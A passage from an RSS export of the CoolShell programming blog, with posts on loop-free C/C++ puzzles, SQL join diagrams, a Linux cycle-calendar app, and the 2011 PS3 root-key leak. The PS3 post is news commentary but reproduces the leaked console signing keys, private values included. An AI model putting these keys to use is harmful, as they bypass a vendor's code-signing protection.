<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17634.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_title">Chrome开发者工具的小技巧</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9666.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_title">浏览器的渲染原理简介</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5537.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5537.html" class="wp_rp_title">一些文章资源和趣闻</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5709.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5709.html" class="wp_rp_title">API设计：用流畅接口构造内部DSL</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5576.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5576.html" class="wp_rp_title">那些曾伴我走过编程之路的软件</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3437" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="7e7a2504c3">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>11</strong> 人打了分，平均分： <strong>3.45</strong> )<br><span class="post-ratings-text" id="ratings_3437_text"></span><meta itemprop="name" content="一些杂项资源">
<meta itemprop="headline" content="一些杂项资源">
<meta itemprop="description" content="以前给大家介绍过一些非常有意思的杂项资源，今天再给大家介绍一些。（虽然没有上次的多，也算是一个新年礼物吧）

	首先，如果你想在你的web页上做一个小提示，你不妨到http://projects.nickstakenburg.com/tipped上看看，各种各样的提示风格，很不错。而且兼容于四大主流浏览器——Chrome, Firefox, IE, Safari。


	如果你想让Jav...">
<meta itemprop="datePublished" content="2010-12-31T13:00:00+08:00">
<meta itemprop="dateModified" content="2010-12-31T01:05:06+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3437.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3437.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.45">
<meta itemprop="ratingCount" content="11">
</div>
</div>
<div id="post-ratings-3437-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2010-12-31T13:00:00+08:00</pubDate>
<guid>https://coolshell.cn/articles/3437.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 输出从1到1000的数 ]]></title>
<link>https://coolshell.cn/articles/3445.html</link>
<content><![CDATA[ 
<p>有这样一个面试题——<strong>请把从1到1000的数打印出来，但你不能使用任何的循环语句或是条件语句。更不能写1000个printf或是cout</strong>。<strong>用C/C++语言</strong>。</p>
<p>我相信，大多数人一开始你可能想到的是递归算法：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void f(int n){
    printf("%d\n",n);
    (1000-n) ? f(n+1) : exit(0) ;
}
int main(){
    f(1);
}
</pre>
<p>当然，题目中说了不能使用条件语句，所以，上面那种解法的不符合题意的，因为还是变向地使用了条件表达式。不过，我们可以用别的方法来让这个递归终止，比如：</p>
<p>除以零，当程序crash，呵呵。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void f(int n){
    printf("%d\n",n);
    n/(1000-n);
    f(n+1);
}</pre>
<p>还有这样退出递归的：</p>
<p><span id="more-3445"></span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void yesprint(int i);
void noprint(int i);

typedef void(*fnPtr)(int);
fnPtr dispatch[] = { yesprint, noprint };

void yesprint(int i) {
    printf("%d\n", i);
    dispatch[i / 1000](i + 1);
}

void noprint(int i) { /* do nothing. */ }

int main() {
      yesprint(1);
}
</pre>
<p>还有下面这些各种各样的解法：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include&lt;stdio.h&gt;

/* prints number  i */
void print1(int i) {
    printf("%d\n",i);
}

/* prints 10 numbers starting from i */
void print10(int i) {
    print1(i);
    print1(i+1);
    print1(i+2);
    print1(i+3);
    print1(i+4);
    print1(i+5);
    print1(i+6);
    print1(i+7);
    print1(i+8);
    print1(i+9);
}

/* prints 100 numbers starting from i */
void print100(int i) {
    print10(i);
    print10(i+10);
    print10(i+20);
    print10(i+30);
    print10(i+40);
    print10(i+50);
    print10(i+60);
    print10(i+70);
    print10(i+80);
    print10(i+90);
}

/* prints 1000 numbers starting from i */
void print1000(int i) {
    print100(i);
    print100(i+100);
    print100(i+200);
    print100(i+300);
    print100(i+400);
    print100(i+500);
    print100(i+600);
    print100(i+700);
    print100(i+800);
    print100(i+900);
}

int main() {
        print1000(1);
        return 0;
}</pre>
<p>不过，print用得多了一些。我们可以用宏嘛。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include&lt;stdio.h&gt;
#define Out(i)       printf("%d\n", i++);
#define REP(N)       N N N N N N N N N N
#define Out1000(i)   REP(REP(REP(Out(i))));
void main()
{
    int i = 1;
    Out1000(i);
}</pre>
<p>不过，我们应该使用C++的一些特性，比如：</p>
<p>使用构造函数</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">class Printer
{
public:
    Printer() { static unsigned i=1; cout &lt;&lt; i++ &lt;&lt; endl;; }

};

int main()
{
    Printer p[1000];
}
</pre>
<p>或是更为NB的Template：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">template&lt;int N&gt;
struct NumberGeneration{
    static void out(std::ostream&amp; os)
    {
        NumberGeneration&lt;N-1&gt;::out(os);
        os &lt;&lt; N &lt;&lt; std::endl;
    }
};

template&lt;&gt;
struct NumberGeneration&lt;1&gt;{
    static void out(std::ostream&amp; os)
    {
        os &lt;&lt; 1 &lt;&lt; std::endl;
    }
};

int main(){
    NumberGeneration&lt;1000&gt;::out(std::cout);
}</pre>
<p>最后来个BT一点的：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void main(int j) {
    printf("%d\n", j);
    (main + (exit - main)*(j/1000))(j+1);
}
</pre>
<p>本文来自: <a href="https://stackoverflow.com/q/4568645/89806" target="_blank">http://stackoverflow.com/q/4568645/89806</a></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/7965.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7965.html" class="wp_rp_title">一个fork的面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4162.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4162.html" class="wp_rp_title">又一个有趣的面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3961.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3961.html" class="wp_rp_title">“火柴棍式”程序员面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3738.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3738.html" class="wp_rp_title">打印质数的各种算法</a>
</li>
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/10478.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/10478.html" class="wp_rp_title">C++面试中string类的一种正确写法</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3445" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="2c20205ee7">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>18</strong> 人打了分，平均分： <strong>4.06</strong> )<br><span class="post-ratings-text" id="ratings_3445_text"></span><meta itemprop="name" content="输出从1到1000的数">
<meta itemprop="headline" content="输出从1到1000的数">
<meta itemprop="description" content='有这样一个面试题——请把从1到1000的数打印出来，但你不能使用任何的循环语句或是条件语句。更不能写1000个printf或是cout。用C/C++语言。

我相信，大多数人一开始你可能想到的是递归算法：

[c]
void f(int n){
    printf("%d\n",n);
    (1000-n) ? f(n+1) : exit(0) ;
}
int main()...'>
<meta itemprop="datePublished" content="2011-01-07T08:55:32+08:00">
<meta itemprop="dateModified" content="2011-04-11T08:03:15+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3445.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3445.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.06">
<meta itemprop="ratingCount" content="18">
</div>
</div>
<div id="post-ratings-3445-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-07T08:55:32+08:00</pubDate>
<guid>https://coolshell.cn/articles/3445.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Sony PS3 Root Key 被破解 ]]></title>
<link>https://coolshell.cn/articles/3453.html</link>
<content><![CDATA[ 
<p>著名的黑客George “GeoHot” Hotz（其也帮助破解了iPhone）宣称破解了Sony P3的root key（也称front door key），并将这个key公布于 <a href="http://www.geohot.com/" target="_blank">http://www.geohot.com/</a> （墙）。不但发布了root key，还做了一个hello world。Youtube上也有一个相关的视频：<a href="https://www.youtube.com/watch?v=UkLSXsCKDkg" target="_blank">http://www.youtube.com/watch?v=UkLSXsCKDkg</a></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">erk: C0 CE FE 84 C2 27 F7 5B D0 7A 7E B8 46 50 9F 93 B2 38 E7 70 DA CB 9F F4 A3 88 F8 12 48 2B E2 1B
riv: 47 EE 74 54 E4 77 4C C9 B8 96 0C 7B 59 F4 C1 4D
pub: C2 D4 AA F3 19 35 50 19 AF 99 D4 4E 2B 58 CA 29 25 2C 89 12 3D 11 D6 21 8F 40 B1 38 CA B2 9B 71 01 F3 AE B7 2A 97 50 19
 R: 80 6E 07 8F A1 52 97 90 CE 1A AE 02 BA DD 6F AA A6 AF 74 17
 n: E1 3A 7E BC 3A CC EB 1C B5 6C C8 60 FC AB DB 6A 04 8C 55 E1
 K: BA 90 55 91 68 61 B9 77 ED CB ED 92 00 50 92 F6 6C 7A 3D 8D
 Da: C5 B2 BF A1 A4 13 DD 16 F2 6D 31 C0 F2 ED 47 20 DC FB 06 70</pre>
<p>之所以叫“front door key”，其是相对于“back door” 而言，传统的破解一般是通过软件的某个 bug或是后门来破解。而这次的PS3走的是前门，这就是说——这已经不是破解了，这是完全意义上的PS3正版了。</p>
<p>为什么呢。这和PS3的开发有关。其很像Symbian 的Sign，也就是说，游戏开发商要想让他们的游戏在PS3上发布，其需要把游戏通过法律流程交给Sony，然后被Sign上一个key，就可以成为正式的发行版并可在所有用户的PS3上运行了。所以，这个key是PS3到今天没有盗版游戏的关键。不过随着这个key被找到，这意味着任何人都可以在PS3上发布软件了。</p>
<p>最要命的是，这个Key和PS3的硬件绑定，也就是说，<strong>如果Sony要阻止这个事的话，无法通过升级firmware完成，必需更换硬件！！</strong></p>
<p><strong><span id="more-3453"></span><br>
</strong></p>
<p>目前，SONY正式对PS3的Root Key被公布导致可以进行自制系统开发的问题<a href="http://www.next-gen.biz/news/sony-responds-to-ps3-hacks" target="_blank">进行回应</a>。SONY表示目前正在进行相关调查，问题会通过网络更新进行解决，具体情况涉及信息安全问题不便透露。</p>
<p>不过之前黑客集团表示除非Sony出新硬件否则无法修正这一情况，Sony应该会接受这一事实。</p>
<p>而最新的<a href="http://www.ps3-hacks.com/2011/01/04/ps3-custom-firmware-creator-released-permanently-add-install-pkgs-to-the-xmb/" target="_blank">PS3 Custom Firmware Creator</a>应该是把PS3送上断头台了。而且已经证实，3.55的玩友可以安装3.55的CFW自制系统，安裝之后可以正常运行正版游戏，可以通过选项菜单中多出的pkg安裝功能，安裝u盘里通过电脑下载的游戏更新补丁或是游戏的试玩版。<strong>现在的PS3就像一个PC机，等待着各种不受Sony控制的软件的到来……</strong></p>
<p>（另：Freebsd<a href="https://lists.freebsd.org/pipermail/freebsd-current/2011-January/022104.html">宣布</a>支持索尼的游戏机PS3，支持的型号是索尼Playstation 3 Fat版，固件版本号&lt; 3.21 （最新的固件版本是<a href="https://us.playstation.com/support/systemupdates/ps3/index.htm">3.55版</a>），必须能网络启动。不过，因为黑客已经破译了root key，并允许创作自制固件，因此未来Freebsd或能支持所有版本的PS3。）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/1387.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1387.html" class="wp_rp_title">十个Web开发文章和教程</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1751.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1751.html" class="wp_rp_title">Go 语言：Google 的新编程语言</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1539.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1539.html" class="wp_rp_title">用脚本实现哄小孩睡觉</a>
</li>
<li>
<a href="https://coolshell.cn/articles/76.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/76.html" class="wp_rp_title">怎样做一个 Program Manager</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4976.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4976.html" class="wp_rp_title">给程序员新手的一些建议</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5426.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5426.html" class="wp_rp_title">简明 Vim 练级攻略</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3453" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="4bdd32b06c">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>5</strong> 人打了分，平均分： <strong>3.40</strong> )<br><span class="post-ratings-text" id="ratings_3453_text"></span><meta itemprop="name" content="Sony PS3 Root Key 被破解">
<meta itemprop="headline" content="Sony PS3 Root Key 被破解">
<meta itemprop="description" content='著名的黑客George "GeoHot" Hotz（其也帮助破解了iPhone）宣称破解了Sony P3的root key（也称front door key），并将这个key公布于 http://www.geohot.com/ （墙）。不但发布了root key，还做了一个hello world。Youtube上也有一个相关的视频：http://www.youtube.com/watch?v=Uk...'>
<meta itemprop="datePublished" content="2011-01-10T09:02:28+08:00">
<meta itemprop="dateModified" content="2011-01-17T22:03:26+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3453.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3453.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="3.4">
<meta itemprop="ratingCount" content="5">
</div>
</div>
<div id="post-ratings-3453-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-10T09:02:28+08:00</pubDate>
<guid>https://coolshell.cn/articles/3453.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 图解SQL的Join ]]></title>
<link>https://coolshell.cn/articles/3463.html</link>
<content><![CDATA[ 
<p>对于SQL的Join，在学习起来可能是比较乱的。我们知道，<a href="https://en.wikipedia.org/wiki/Join_(SQL)" target="_blank">SQL的Join语法</a>有很多inner的，有outer的，有left的，有时候，对于Select出来的结果集是什么样子有点不是很清楚。Coding Horror上有<a href="http://www.codinghorror.com/blog/2007/10/a-visual-explanation-of-sql-joins.html" target="_blank">一篇文章</a>（实在不清楚为什么Coding Horror也被墙）通过 文氏图 <a href="https://en.wikipedia.org/wiki/Venn_diagram" target="_blank">Venn diagrams</a> 解释了SQL的Join。我觉得清楚易懂，转过来。</p>
<p>假设我们有两张表。</p>
<ul>
<li>
<strong>Table A</strong> 是左边的表。</li>
<li>
<strong>Table B</strong> 是右边的表。</li>
</ul>
<p>其各有四条记录，其中有两条记录是相同的，如下所示：</p>
<pre>id name       id  name
-- ----       --  ----
1  <span style="color: red;">Pirate</span>     1   Rutabaga
2  Monkey     2   <span style="color: red;">Pirate</span>
3  <span style="color: red;">Ninja</span>      3   Darth Vader
4  Spaghetti  4   <span style="color: red;">Ninja</span></pre>
<p>下面让我们来看看不同的Join会产生什么样的结果。</p>
<p><span id="more-3463"></span></p>
<table>
<tbody>
<tr>
<td>
<pre>SELECT * FROM TableA
<strong>INNER JOIN</strong> TableB
ON TableA.name = TableB.name

id  name       id   name
--  ----       --   ----
1   Pirate     2    Pirate
3   Ninja      4    Ninja</pre>
<p><strong>Inner join</strong><br>
产生的结果集中，是A和B的交集。</p>
</td>
<td><img alt="image placeholder" ></td>
</tr>
<tr>
<td>
<pre>SELECT * FROM TableA
<strong>FULL OUTER JOIN</strong> TableB
ON TableA.name = TableB.name

id    name       id    name
--    ----       --    ----
1     Pirate     2     Pirate
2     Monkey     <span style="color: gray;">null</span>  <span style="color: gray;">null</span>
3     Ninja      4     Ninja
4     Spaghetti  <span style="color: gray;">null</span>  <span style="color: gray;">null</span>
<span style="color: gray;">null</span>  <span style="color: gray;">null</span>       1     Rutabaga
<span style="color: gray;">null</span>  <span style="color: gray;">null</span>       3     Darth Vader</pre>
<p><strong>Full outer join</strong> 产生A和B的并集。但是需要注意的是，对于没有匹配的记录，则会以null做为值。</p>
</td>
<td><img alt="image placeholder" ></td>
</tr>
<tr>
<td>
<pre>SELECT * FROM TableA
<strong>LEFT OUTER JOIN</strong> TableB
ON TableA.name = TableB.name

id  name       id    name
--  ----       --    ----
1   Pirate     2     Pirate
2   Monkey     <span style="color: gray;">null</span>  <span style="color: gray;">null</span>
3   Ninja      4     Ninja
4   Spaghetti  <span style="color: gray;">null</span>  <span style="color: gray;">null</span></pre>
<p><strong>Left outer join</strong> 产生表A的完全集，而B表中匹配的则有值，没有匹配的则以null值取代。</p>
</td>
<td><img alt="image placeholder" ></td>
</tr>
<tr>
<td>
<pre>SELECT * FROM TableA
LEFT OUTER JOIN TableB
ON TableA.name = TableB.name
<strong>WHERE TableB.id IS null</strong> 

id  name       id     name
--  ----       --     ----
2   Monkey     <span style="color: gray;">null</span>   <span style="color: gray;">null</span>
4   Spaghetti  <span style="color: gray;">null</span>   <span style="color: gray;">null</span></pre>
<p>产生在A表中有而在B表中没有的集合。</p>
</td>
<td><img alt="image placeholder" ></td>
</tr>
<tr>
<td>
<pre>SELECT * FROM TableA
FULL OUTER JOIN TableB
ON TableA.name = TableB.name
<strong>WHERE TableA.id IS null
OR TableB.id IS null
</strong>
id    name       id    name
--    ----       --    ----
2     Monkey     <span style="color: gray;">null</span>  <span style="color: gray;">null</span>
4     Spaghetti  <span style="color: gray;">null</span>  <span style="color: gray;">null</span>
<span style="color: gray;">null</span>  <span style="color: gray;">null</span>       1     Rutabaga
<span style="color: gray;">null</span>  <span style="color: gray;">null</span>       3     Darth Vader</pre>
<p>产生A表和B表都没有出现的数据集。</p>
</td>
<td><img alt="image placeholder" ></td>
</tr>
</tbody>
</table>
<p>还需要注册的是我们还有一个是“交差集” <strong>cross join</strong>, 这种Join没有办法用文式图表示，因为其就是把表A和表B的数据进行一个N*M的组合，即笛卡尔积。表达式如下：</p>
<pre>SELECT * FROM TableA
<strong>CROSS JOIN</strong> TableB</pre>
<p>这个笛卡尔乘积会产生 4 x 4 = 16 条记录，一般来说，我们很少用到这个语法。但是我们得小心，如果不是使用嵌套的select语句，一般系统都会产生笛卡尔乘积然再做过滤。这是对于性能来说是非常危险的，尤其是表很大的时候。</p>
<p><em><strong>更新:2014年3月30日</strong></em></p>
<p><img alt="image placeholder" ></p>
<p>(全文完)</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/8711.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_title">程序员疫苗：代码注入</a>
</li>
<li>
<a href="https://coolshell.cn/articles/7490.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_title">性能调优攻略</a>
</li>
<li>
<a href="https://coolshell.cn/articles/7270.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/7270.html" class="wp_rp_title">NoSQL 数据建模技术</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6639.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6639.html" class="wp_rp_title">千万别惹程序员 </a>
</li>
<li>
<a href="https://coolshell.cn/articles/3433.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3433.html" class="wp_rp_title">6个有用的MySQL语句</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1957.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1957.html" class="wp_rp_title">Web程序的最佳测试数据</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3463" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="7b090f6694">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>25</strong> 人打了分，平均分： <strong>4.64</strong> )<br><span class="post-ratings-text" id="ratings_3463_text"></span><meta itemprop="name" content="图解SQL的Join">
<meta itemprop="headline" content="图解SQL的Join">
<meta itemprop="description" content="对于SQL的Join，在学习起来可能是比较乱的。我们知道，SQL的Join语法有很多inner的，有outer的，有left的，有时候，对于Select出来的结果集是什么样子有点不是很清楚。Coding Horror上有一篇文章（实在不清楚为什么Coding Horror也被墙）通过 文氏图 Venn diagrams 解释了SQL的Join。我觉得清楚易懂，转过来。

假设我们有两张表。
...">
<meta itemprop="datePublished" content="2011-01-11T08:44:09+08:00">
<meta itemprop="dateModified" content="2014-03-30T11:41:00+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3463.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3463.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.64">
<meta itemprop="ratingCount" content="25">
</div>
</div>
<div id="post-ratings-3463-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-01-11T08:44:09+08:00</pubDate>
<guid>https://coolshell.cn/articles/3463.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Linux的cycle日历（你懂的） ]]></title>
<link>https://coolshell.cn/articles/3489.html</link>
<content><![CDATA[ 
<p>这是一个开源项目：<a href="http://cycle.sourceforge.net/" target="_blank">http://cycle.sourceforge.net/</a>，其是用python写的。在项目的主页上说，这是一个给妇女用的日历程序，叫cycle，周期，给妇女的，我不多说了，你懂的。下面是一些介绍（请大家注意学习相关的英文单词）</p>
<p>当然，这个小程序不单单只是查看妇女的“周期”（menstruation），其还提供了以下的功能：</p>
<ul>
<li>第一次的周期 – 在日历上显示为粉色。menstruation周期长度由用户输入的六次周期取平均值确定。</li>
<li>排卵期（Ovulation day）- 在日历上显示为亮绿色，</li>
<li>受精期 （Fertile period）- 在日历上显示为绿色</li>
<li>安全期（Safe Sex）</li>
<li>预产期（Date of birth）</li>
<li>还允许你记一些notes – 医生建议你服用一些荷尔蒙避孕药（hormonal contraceptive）</li>
</ul>
<p>下面是屏幕截图 ——</p>
<p style="text-align: center;"><a href="http://cycle.sourceforge.net/scr1.png"><img alt="image placeholder" ></a></p>
<p style="text-align: left;">注意以下的免责条款：</p>
<ul>
<li>本程序并不能成为一种避孕的方法。</li>
<li>本程序也不能阻止各种性传染病，如：AIDS</li>
<li>本程序更不能取代你的妇科医生。</li>
</ul>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018) 与我的专栏</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19219.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_title">打造高效的工作环境 – Shell 篇</a>
</li>
<li>
<a href="https://coolshell.cn/articles/18654.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/18654.html" class="wp_rp_title">记一次Kubernetes/Docker网络排障</a>
</li>
<li>
